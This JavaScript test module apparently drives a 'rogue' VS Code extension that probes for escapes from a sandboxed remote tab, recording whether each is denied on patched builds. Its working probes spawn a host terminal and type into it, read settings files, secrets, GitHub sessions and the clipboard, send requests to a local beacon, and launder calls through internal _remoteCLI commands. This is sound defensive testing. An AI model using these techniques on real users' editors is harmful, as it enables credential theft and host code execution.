// RPC escape probes, run from inside a tab by the rogue extension.
//
// Each probe attempts one concrete escape named in rpc-filter/policy/policy.json
// and records whether it SUCCEEDED or was DENIED. It never asserts: the harness
// decides, because the expected outcome differs by build.
//
//   unpatched build -> every probe must SUCCEED. A probe that has never
//                      succeeded proves nothing; it may simply be broken.
//   patched build   -> every probe must be DENIED.
//
// Probes are deliberately written against the public extension API wherever the
// escape is reachable that way, because that is what a real rogue extension
// has. Escapes that need raw RPC or an IPC channel live in the rogue-REH
// fixture instead: the extension host cannot reach them.
//
// Only ever run against our own local builds. Never against anything else.

const SUCCEEDED = 'succeeded';
const DENIED = 'denied';
const ERROR = 'error';

/**
 * A denial raised by our filter, as opposed to an unrelated failure. The filter
 * rejects with a recognisable message so a probe cannot score a denial just by
 * being broken -- that distinction is the whole point of running probes against
 * the unpatched build first.
 */
function classify(err) {
	const msg = String(err && err.message ? err.message : err);
	if (/seclab: denied|not allowed in a sandboxed|unsupported operation/i.test(msg)) {
		return { outcome: DENIED, detail: msg };
	}
	return { outcome: ERROR, detail: msg };
}

async function probe(results, id, policyRef, fn) {
	const started = Date.now();
	try {
		const detail = await fn();
		results.push({
			id, policyRef, outcome: SUCCEEDED,
			detail: typeof detail === 'string' ? detail : JSON.stringify(detail ?? null),
			ms: Date.now() - started,
		});
	} catch (err) {
		const { outcome, detail } = classify(err);
		results.push({ id, policyRef, outcome, detail, ms: Date.now() - started });
	}
}

/**
 * @param vscode the extension API
 * @param context the extension context
 * @param targets parsed .seclab/targets: canary, marker, beacon, othertab
 */
async function runProbes(vscode, context, targets) {
	const results = [];
	const Uri = vscode.Uri;
	const beacon = targets.beacon ? `http://127.0.0.1:${targets.beacon}` : null;

	// --- host code execution -------------------------------------------------
	// workbench.action.terminal.newLocal creates a terminal on the HOST even in a
	// remote window; sendSequence then types into it. Together they are the
	// canonical confused-deputy chain.
	await probe(results, 'host-terminal-newlocal', 'cmd:workbench.action.terminal.newLocal',
		() => vscode.commands.executeCommand('workbench.action.terminal.newLocal'));
	await probe(results, 'host-terminal-sendsequence', 'cmd:workbench.action.terminal.sendSequence',
		() => vscode.commands.executeCommand('workbench.action.terminal.sendSequence',
			{ text: `touch '${targets.marker}'\n` }));

	// --- host filesystem -----------------------------------------------------
	// $readFile accepts any scheme the IFileService can resolve. vscode-userdata:
	// reaches the real user settings, which hold a seeded canary.
	await probe(results, 'host-fs-read-userdata', 'rpc:MainThreadFileSystem.$readFile',
		async () => {
			const buf = await vscode.workspace.fs.readFile(Uri.parse('vscode-userdata:/User/settings.json'));
			return Buffer.from(buf).toString('utf8').slice(0, 4096);
		});
	await probe(results, 'host-fs-read-file-scheme', 'rpc:MainThreadFileSystem.$readFile',
		async () => {
			const buf = await vscode.workspace.fs.readFile(Uri.file(targets.canary));
			return Buffer.from(buf).toString('utf8');
		});
	await probe(results, 'host-fs-write-file-scheme', 'rpc:MainThreadFileSystem.$writeFile',
		async () => {
			const target = Uri.file(`${targets.marker}.rpcwrite`);
			await vscode.workspace.fs.writeFile(target, Buffer.from('written by a tab\n'));
			return target.toString();
		});

	// --- secrets -------------------------------------------------------------
	// SecretStorage is keyed {extensionId, key} globally, so a value written in
	// one tab is readable in another by the same extension. The harness opens two
	// tabs and compares.
	await probe(results, 'secret-write-own', 'rpc:MainThreadSecretState.$setPassword',
		async () => {
			await context.secrets.store('seclab-probe', `from-${process.env.SECLAB_TAB_ID ?? 'unknown'}`);
			return 'stored';
		});
	await probe(results, 'secret-read-cross-tab', 'rpc:MainThreadSecretState.$getPassword',
		async () => (await context.secrets.get('seclab-probe')) ?? '(absent)');

	// --- credentials ---------------------------------------------------------
	// getSession must return a sentinel, never a reusable token. The canary
	// harness checks the value; this records whether a session came back at all.
	await probe(results, 'auth-get-session', 'rpc:MainThreadAuthentication.$getSession',
		async () => {
			const s = await vscode.authentication.getSession('github', ['repo'], { silent: true });
			return s ? { account: s.account?.label ?? null, tokenLength: String(s.accessToken ?? '').length } : null;
		});
	// The clipboard routinely holds a token the user just copied.
	await probe(results, 'clipboard-read', 'rpc:MainThreadClipboard.$readText',
		() => vscode.env.clipboard.readText());

	// --- egress around the broker -------------------------------------------
	// openExternal hands a URI to the HOST opener, so it leaves the tab without
	// passing the tab's broker. A beacon hit proves egress, not just a return
	// value.
	if (beacon) {
		await probe(results, 'open-external-silent', 'rpc:MainThreadWindow.$openUri',
			() => vscode.env.openExternal(Uri.parse(`${beacon}/open-external`)));
		await probe(results, 'as-external-uri', 'rpc:MainThreadWindow.$asExternalUri',
			async () => (await vscode.env.asExternalUri(Uri.parse(`${beacon}/as-external`))).toString());
		// Webviews render in the LOCAL trusted renderer, so their fetches have the
		// host's network position and bypass the tab broker entirely.
		await probe(results, 'webview-egress', 'data:webview-content',
			async () => {
				const panel = vscode.window.createWebviewPanel('seclabProbe', 'probe',
					{ viewColumn: 1, preserveFocus: true }, { enableScripts: true });
				panel.webview.html = `<!doctype html><script>
					fetch(${JSON.stringify(`${beacon}/webview`)}, { mode: 'no-cors' })
						.catch(() => {});
				</script>`;
				await new Promise(r => setTimeout(r, 2000));
				panel.dispose();
				return 'webview rendered; check the beacon log';
			});
	}

	// --- reconnaissance ------------------------------------------------------
	// $getCommands must not hand back the full registry: it tells an attacker
	// exactly which host commands exist to try.
	await probe(results, 'command-enumeration', 'rpc:MainThreadCommands.$getCommands',
		async () => {
			const all = await vscode.commands.getCommands(true);
			const dangerous = all.filter(c => c.startsWith('_remoteCLI.')
				|| c === 'workbench.action.terminal.newLocal');
			return { total: all.length, dangerousVisible: dangerous };
		});

	// --- verdict laundering --------------------------------------------------
	// The real shape, from upstream: _remoteCLI.windowOpen's handler resolves
	// ICommandService from its accessor and executes _files.windowOpen. Denying
	// only the inner id leaves the outer one as a working path.
	await probe(results, 'launder-direct', 'cmd:_remoteCLI.windowOpen',
		() => vscode.commands.executeCommand('_remoteCLI.windowOpen', [], {}));
	await probe(results, 'launder-open-external', 'cmd:_remoteCLI.openExternal',
		() => vscode.commands.executeCommand('_remoteCLI.openExternal',
			beacon ? `${beacon}/remotecli` : 'https://example.invalid/'));
	await probe(results, 'launder-manage-extensions', 'cmd:_remoteCLI.manageExtensions',
		() => vscode.commands.executeCommand('_remoteCLI.manageExtensions', { list: {} }));

	// Async-hop laundering. These need a host-side command that nests across an
	// await, a timer and an event, which upstream does not provide, so they are
	// driven by the test-only contribution the containment build registers (see
	// rpc-filter/probes/README.md). Without it they report ERROR, not SUCCEEDED,
	// so a missing fixture can never be mistaken for containment.
	for (const hop of ['await', 'timer', 'event', 'captured-service']) {
		await probe(results, `launder-${hop}`, 'cmd:_seclabTest.launder',
			() => vscode.commands.executeCommand('_seclabTest.launder', hop,
				'workbench.action.terminal.newLocal'));
	}

	return results;
}

module.exports = { runProbes, SUCCEEDED, DENIED, ERROR };
